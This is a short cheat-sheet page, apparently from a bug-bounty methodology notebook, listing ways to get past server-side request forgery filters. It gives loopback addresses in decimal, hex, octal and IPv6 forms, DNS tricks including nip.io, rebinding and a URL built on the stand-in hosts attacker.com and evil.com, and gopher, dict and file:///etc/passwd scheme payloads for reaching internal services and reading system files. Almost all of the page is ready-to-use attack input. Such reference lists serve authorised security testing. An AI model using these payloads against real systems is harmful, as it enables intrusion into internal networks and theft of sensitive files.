> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/bypass/00-index|← Back to Bypass]] · Related: [[03-ssrf|SSRF playbook]]

# SSRF Filter Bypass

## IP Representation

```
http://2130706433/         (decimal for 127.0.0.1)
http://0x7f000001/         (hex)
http://0177.0.0.1/         (octal)
http://[::1]/              (IPv6 loopback)
http://[0:0:0:0:0:0:0:1]/
```

## DNS Tricks

- `http://internal-service.local/`
- nip.io, sslip.io (resolve to any IP)
- DNS rebinding
- `http://attacker.com#@evil.com/`

## URL Schema

```
gopher://internal:port/_GET / HTTP/1.1\n\n
dict://internal:port/info
file:///etc/passwd
```
